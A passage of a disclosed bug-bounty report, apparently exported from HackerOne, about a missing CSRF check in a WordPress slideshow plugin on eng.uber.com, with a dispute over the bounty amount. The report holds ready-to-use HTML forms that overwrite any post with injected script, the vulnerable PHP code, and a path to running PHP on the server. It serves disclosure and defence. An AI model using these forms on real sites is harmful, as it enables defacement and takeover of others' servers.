            "message": "Just as a quick note, a lot of this discussion has made us much more aware of some points of our bug bounty scoping page which are likely confusing to our submitters. I've drafted an update to our scoping page to more clearly explain how we do impact-based rewarding. The basic idea there is we reward based off of impact and don't reward less if an exploit \"wasn't clever\", etc (as some other bug bounty programs do). So this is why we would reward an exploit in a datacenter host more that a host on WPEngine, for example. At the end of the day we care about protecting our user's information, so any exploit which allows you to get that is something we are very concerned about. I apologize for the confusion here, we thought our impact-based rewarding would be obvious but clearly this isn't the case.\n\n>It's certainly a bit confusing. You explained that the #125441 bounty was the maximum you'd consider for a reflected XSS ($3k) because the policy didn't make it clear that the stated sums were maximums. \n>Instead, there was no bounty at all in addition to the separate reflected XSS bug.\n\nSo this is two things put together:\n\n* We rewarded the maximum for the XSS because we weren't clear that 3K was the maximum amount in our first attempt at bug bounty scope\n* In the case of \"this plugin has 20 CSRF and 10 XSS bugs\" we reward for the highest impact bug (in this case XSS - which was 3K max). The idea here is that we could have a plugin with 20 different XSS bugs but it would be silly to reward 3K for each (60K!) when the end fix is the same - removing the plugin.\n\n>How CSRF+stored XSS (+RCE?) PLUS an unspecified bump-up bonus, PLUS a separate reflected XSS worth $3k still equals $3k remains elusive.\n\nI think the \"bumping\" statement was mispoken because it wasn't \"bumped\" up because it was already at the XSS maximum payout (as you noted).\n\n>If there was a problem with my report and the impact wasn't what I stated, and that's why the second bug was worth nothing... then why didn't I hear about it until 15 days after the report was closed and the bounty issued? Disabling plugin editing most definitely doesn't prevent RCE if you can run JS with WP administrator privileges.\n\nWe determined the impact at the time of the reward meeting. Generally researcher-provided impact is problematic because it makes a lot of assumptions about our internal infrastructure which is often incorrect. Debating impact back and forth is something we generally don't do because it eats up all of our time and wouldn't leave us with any time to process new submissions. Obviously this is a non-perfect process but the other option being us teaching every bug bounty submitter how all of our internal systems interact. That being said, with this statement:\n\n>Disabling plugin editing most definitely doesn't prevent RCE if you can run JS with WP administrator privileges.\n\nAs I previously stated I am open to hearing how RCE could have been achieved here. If we missed something we are more than happy to take additional stated impact into account. It seems you have provided another possible exploit scenario which we will evaluate and get back to you on.", 
            "markdown_message": "<p>Just as a quick note, a lot of this discussion has made us much more aware of some points of our bug bounty scoping page which are likely confusing to our submitters. I&#39;ve drafted an update to our scoping page to more clearly explain how we do impact-based rewarding. The basic idea there is we reward based off of impact and don&#39;t reward less if an exploit &quot;wasn&#39;t clever&quot;, etc (as some other bug bounty programs do). So this is why we would reward an exploit in a datacenter host more that a host on WPEngine, for example. At the end of the day we care about protecting our user&#39;s information, so any exploit which allows you to get that is something we are very concerned about. I apologize for the confusion here, we thought our impact-based rewarding would be obvious but clearly this isn&#39;t the case.</p>\n\n<blockquote>\n<p>It&#39;s certainly a bit confusing. You explained that the <a href=\"/reports/125441\">#125441</a> bounty was the maximum you&#39;d consider for a reflected XSS ($3k) because the policy didn&#39;t make it clear that the stated sums were maximums. <br>\nInstead, there was no bounty at all in addition to the separate reflected XSS bug.</p>\n</blockquote>\n\n<p>So this is two things put together:</p>\n\n<ul>\n<li>We rewarded the maximum for the XSS because we weren&#39;t clear that 3K was the maximum amount in our first attempt at bug bounty scope</li>\n<li>In the case of &quot;this plugin has 20 CSRF and 10 XSS bugs&quot; we reward for the highest impact bug (in this case XSS - which was 3K max). The idea here is that we could have a plugin with 20 different XSS bugs but it would be silly to reward 3K for each (60K!) when the end fix is the same - removing the plugin.</li>\n</ul>\n\n<blockquote>\n<p>How CSRF+stored XSS (+RCE?) PLUS an unspecified bump-up bonus, PLUS a separate reflected XSS worth $3k still equals $3k remains elusive.</p>\n</blockquote>\n\n<p>I think the &quot;bumping&quot; statement was mispoken because it wasn&#39;t &quot;bumped&quot; up because it was already at the XSS maximum payout (as you noted).</p>\n\n<blockquote>\n<p>If there was a problem with my report and the impact wasn&#39;t what I stated, and that&#39;s why the second bug was worth nothing... then why didn&#39;t I hear about it until 15 days after the report was closed and the bounty issued? Disabling plugin editing most definitely doesn&#39;t prevent RCE if you can run JS with WP administrator privileges.</p>\n</blockquote>\n\n<p>We determined the impact at the time of the reward meeting. Generally researcher-provided impact is problematic because it makes a lot of assumptions about our internal infrastructure which is often incorrect. Debating impact back and forth is something we generally don&#39;t do because it eats up all of our time and wouldn&#39;t leave us with any time to process new submissions. Obviously this is a non-perfect process but the other option being us teaching every bug bounty submitter how all of our internal systems interact. That being said, with this statement:</p>\n\n<blockquote>\n<p>Disabling plugin editing most definitely doesn&#39;t prevent RCE if you can run JS with WP administrator privileges.</p>\n</blockquote>\n\n<p>As I previously stated I am open to hearing how RCE could have been achieved here. If we missed something we are more than happy to take additional stated impact into account. It seems you have provided another possible exploit scenario which we will evaluate and get back to you on.</p>\n", 
            "type": "Activities::Comment", 
            "id": 930597, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-21T16:00:32.617Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-21T16:00:32.617Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "I demonstrated RCE with plugin editing disabled e.g. at #136169 which you also confirmed. The lack of bounty here was based on the misassumption that RCE would be impossible. The question was addressed about half a year ago - have you had a change to re-evaluate this yet?", 
            "markdown_message": "<p>I demonstrated RCE with plugin editing disabled e.g. at <a href=\"/reports/136169\">#136169</a> which you also confirmed. The lack of bounty here was based on the misassumption that RCE would be impossible. The question was addressed about half a year ago - have you had a change to re-evaluate this yet?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1260317, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jouko", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jouko", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/013/642/84ded716b305011af6c7091e630ca8ac2c590a87_small.jpg?1423004250"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -81093526.09321998, 
    "disclosed_at": "2016-04-26T16:08:57.530Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/125594", 
    "created_at": "2016-03-24T01:49:54.915Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>The site <em>eng.uber.com</em> uses a WordPress plugin called Fluid Responsive Slideshow. The plugin doesn&#39;t implement any CSRF check for AJAX requests. Some of these AJAX requests can be used to modify posts and pages on the system. An attacker could use this bug to inject arbitrary JavaScript in any page or post on eng.uber.com.</p>\n\n<p>The attack requires that an administrator of the site can be tricked to view an attacker-controlled website. If the attack succeeds, it would normally lead to server-side compromise via the administrative WordPress functions (plugin/theme editor).</p>\n\n<h1 id=\"reproducing\">Reproducing</h1>\n\n<p>The following HTML snippet should be a non-destructive way to test this bug. </p>\n<pre class=\"highlight plaintext\"><code>&lt;form method=post action=&quot;https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_show_modal&quot;&gt;\n&lt;input type=text name=&quot;post_id&quot; value=&quot;zzz&quot;&gt;\n&lt;input type=submit&gt;\n&lt;/form&gt;\n</code></pre>\n<p>If a logged-in WordPress user clicks the submit button, the browser should do a POST request and get a JSON response (it doesn&#39;t matter that the post_id is bogus). This shows that it&#39;s possible to access the AJAX functions of the plugin without any CSRF token or nonce. A non-logged-in user receives just a &quot;0&quot;.</p>\n\n<p>An attacker could use the following HTML to arbitrarily modify any page or post on the system (<strong>destructive</strong>):</p>\n<pre class=\"highlight plaintext\"><code>&lt;form method=post action=&quot;https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_save&quot;&gt;\n&lt;input type=text name=&quot;post_id&quot; value=&quot;(ANY POST/PAGE ID)&quot;&gt;\n&lt;input type=text name=&quot;title&quot; value=&quot;new title for the page&quot;&gt;\n&lt;input type=text name=&quot;content&quot; value=&quot;Any HTML content, e.g. &lt;script&gt;alert(&#39;hello&#39;);&lt;/script&gt;&quot;&gt;\n&lt;input type=submit&gt;\n&lt;/form&gt;\n</code></pre>\n<p>An attacker would have to persuade a logged-in administrator to this form. It can be automatically submitted with JavaScript so a real-world attack wouldn&#39;t require a click on the button. </p>\n\n<p>The frs_save AJAX action would update the post/page with the supplied ID. For example if the latest posting ID is used, the attacker-supplied JavaScript would be embedded on the &quot;front page&quot; and evaluated by any viewer. </p>\n\n<p>A more stealth attack might update an old or password-protected page/post and embed JavaScript that redirects the victim administrator  to that page after updating (an invisible iframe might be possible). This kind of attack wouldn&#39;t be easily detected. In this case the JavaScript, now executing with administrator privileges, could be used to execute attacker-supplied PHP on the server via the plugin or theme editor.</p>\n\n<p>An example of such attack payload (different vector): <a title=\"https://www.youtube.com/watch?v=OCqQZJZ1Ie4\" href=\"/redirect?signature=8761c9d2e9d3a1d58208c79b8bf85f9449788acf&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DOCqQZJZ1Ie4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.youtube.com/watch?v=OCqQZJZ1Ie4</span><i class=\"icon-external-link\"></i></a></p>\n\n<h1 id=\"details\">Details</h1>\n\n<p>The problem is in the file wp-content/plugins/fluid-responsive-slideshow/ajax.php:</p>\n<pre class=\"highlight plaintext\"><code>/**\n * Ajax Save, Edit / Create new is the same, depend on the post id (null/not null)\n */\nadd_action(&#39;wp_ajax_frs_save&#39;, &#39;frs_save&#39; ); /* for logged in user */\n\nfunction frs_save() {\n    global $wpdb; // this is how you get access to the database\n    unset($_POST[&#39;action&#39;]);\n    $id = htmlspecialchars($_POST[&#39;post_id&#39;]);\n</code></pre>\n<p>The AJAX handler function doesn&#39;t attempt to reject cross-site request forgeries which would typically happen in the beginning of the function. Later in the same function, the POST parameters are used to update any post or page:</p>\n<pre class=\"highlight plaintext\"><code>       //edit post\n        $slide_type = htmlspecialchars($_POST[&#39;slide_type&#39;]);\n        $title = htmlspecialchars($_POST[&#39;title&#39;]);\n        $content = $_POST[&#39;content&#39;];\n        // Create post object\n        $my_post = array(\n          &#39;post_title&#39;    =&gt; $title,\n          &#39;post_content&#39;  =&gt; $content,\n          &#39;ID&#39;=&gt;$id\n        );\n        // Insert the post into the database\n        wp_update_post( $my_post );\n\u0303~~~~\n\nI&#39;ve tested this with the latest version of the plugin, and version 2.2.0 which seems to be the one used on eng.uber.com. I haven&#39;t reported this to the plugin author yet.\n</code></pre>", 
    "vulnerability_information": "The site *eng.uber.com* uses a WordPress plugin called Fluid Responsive Slideshow. The plugin doesn't implement any CSRF check for AJAX requests. Some of these AJAX requests can be used to modify posts and pages on the system. An attacker could use this bug to inject arbitrary JavaScript in any page or post on eng.uber.com.\n\nThe attack requires that an administrator of the site can be tricked to view an attacker-controlled website. If the attack succeeds, it would normally lead to server-side compromise via the administrative WordPress functions (plugin/theme editor).\n\n#Reproducing#\nThe following HTML snippet should be a non-destructive way to test this bug. \n~~~~\n<form method=post action=\"https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_show_modal\">\n<input type=text name=\"post_id\" value=\"zzz\">\n<input type=submit>\n</form>\n~~~~\nIf a logged-in WordPress user clicks the submit button, the browser should do a POST request and get a JSON response (it doesn't matter that the post_id is bogus). This shows that it's possible to access the AJAX functions of the plugin without any CSRF token or nonce. A non-logged-in user receives just a \"0\".\n\nAn attacker could use the following HTML to arbitrarily modify any page or post on the system (**destructive**):\n~~~~\n<form method=post action=\"https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_save\">\n<input type=text name=\"post_id\" value=\"(ANY POST/PAGE ID)\">\n<input type=text name=\"title\" value=\"new title for the page\">\n<input type=text name=\"content\" value=\"Any HTML content, e.g. <script>alert('hello');</script>\">\n<input type=submit>\n</form>\n~~~~\nAn attacker would have to persuade a logged-in administrator to this form. It can be automatically submitted with JavaScript so a real-world attack wouldn't require a click on the button. \n\nThe frs_save AJAX action would update the post/page with the supplied ID. For example if the latest posting ID is used, the attacker-supplied JavaScript would be embedded on the \"front page\" and evaluated by any viewer. \n\nA more stealth attack might update an old or password-protected page/post and embed JavaScript that redirects the victim administrator  to that page after updating (an invisible iframe might be possible). This kind of attack wouldn't be easily detected. In this case the JavaScript, now executing with administrator privileges, could be used to execute attacker-supplied PHP on the server via the plugin or theme editor.\n\nAn example of such attack payload (different vector): https://www.youtube.com/watch?v=OCqQZJZ1Ie4\n\n\n#Details#\n\nThe problem is in the file wp-content/plugins/fluid-responsive-slideshow/ajax.php:\n\n~~~~\n/**\n * Ajax Save, Edit / Create new is the same, depend on the post id (null/not null)\n */\nadd_action('wp_ajax_frs_save', 'frs_save' ); /* for logged in user */\n\nfunction frs_save() {\n    global $wpdb; // this is how you get access to the database\n    unset($_POST['action']);\n    $id = htmlspecialchars($_POST['post_id']);\n~~~~\nThe AJAX handler function doesn't attempt to reject cross-site request forgeries which would typically happen in the beginning of the function. Later in the same function, the POST parameters are used to update any post or page:\n~~~~\n       //edit post\n        $slide_type = htmlspecialchars($_POST['slide_type']);\n        $title = htmlspecialchars($_POST['title']);\n        $content = $_POST['content'];\n        // Create post object\n        $my_post = array(\n          'post_title'    => $title,\n          'post_content'  => $content,\n          'ID'=>$id\n        );\n        // Insert the post into the database\n        wp_update_post( $my_post );\n\u0303~~~~\n\nI've tested this with the latest version of the plugin, and version 2.2.0 which seems to be the one used on eng.uber.com. I haven't reported this to the plugin author yet.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}